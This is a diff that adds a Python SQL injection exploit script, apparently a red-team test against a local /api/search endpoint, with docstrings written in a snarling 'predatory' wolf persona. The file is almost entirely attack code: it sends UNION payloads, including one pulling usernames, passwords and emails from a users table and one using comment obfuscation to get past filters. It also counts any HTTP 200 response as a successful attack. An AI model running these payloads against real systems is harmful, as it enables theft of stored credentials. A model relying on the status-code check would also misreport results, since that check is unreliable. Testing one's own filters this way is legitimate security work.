@@ -1,0 +1,95 @@
+"""
+🐺 UNION-BASED SQL INJECTION EXPLOIT
+
+*snarls with predatory glee* Your UNION detection is WEAK! Union-based attacks
+can extract data from multiple tables!
+
+*bares fangs with savage satisfaction* This exploit demonstrates UNION-based
+SQL injection techniques for data extraction.
+"""
+
+import requests
+from typing import List, Dict
+from dataclasses import dataclass
+from rich.console import Console
+
+console = Console()
+
+@dataclass
+class UnionPayload:
+    """Union-based SQL injection payload"""
+    name: str
+    payload: str
+    technique: str
+    description: str
+
+class UnionBasedExploit:
+    """
+    *circles with menacing intent* Exploits UNION-based SQL injection vulnerabilities
+    """
+    
+    def __init__(self, base_url: str = "http://localhost:8000"):
+        self.base_url = base_url
+        self.session = requests.Session()
+    
+    def run_exploit(self) -> List[Dict]:
+        """
+        *snarls with predatory glee* Execute UNION-based SQL injection attacks
+        """
+        console.print("[bold red]🐺 UNION-BASED SQL INJECTION EXPLOIT[/bold red]")
+        
+        payloads = self._generate_union_payloads()
+        results = []
+        
+        for payload in payloads:
+            result = self._test_payload(payload)
+            results.append(result)
+        
+        return results
+    
+    def _generate_union_payloads(self) -> List[UnionPayload]:
+        """Generate UNION-based SQL injection payloads"""
+        return [
+            UnionPayload(
+                name="Basic UNION",
+                payload="' UNION SELECT 1,2,3 --",
+                technique="Basic UNION",
+                description="Basic UNION-based data extraction"
+            ),
+            UnionPayload(
+                name="UNION with Data",
+                payload="' UNION SELECT username,password,email FROM users --",
+                technique="UNION Data Extraction",
+                description="UNION-based user data extraction"
+            ),
+            UnionPayload(
+                name="UNION with Obfuscation",
+                payload="' UN/**/ION SEL/**/ECT * FROM users --",
+                technique="UNION Obfuscation",
+                description="Obfuscated UNION attack"
+            )
+        ]
+    
+    def _test_payload(self, payload: UnionPayload) -> Dict:
+        """Test a UNION payload"""
+        try:
+            response = self.session.post(
+                f"{self.base_url}/api/search",
+                json={'query': payload.payload},
+                timeout=5
+            )
+            
+            return {
+                'payload': payload,
+                'success': response.status_code == 200,
+                'response_code': response.status_code,
+                'description': f"{payload.description} - {'SUCCESS' if response.status_code == 200 else 'BLOCKED'}"
+            }
+            
+        except Exception as e:
+            return {
+                'payload': payload,
+                'success': False,
+                'response_code': 0,
+                'description': f"{payload.description} - ERROR: {str(e)}"
+            }
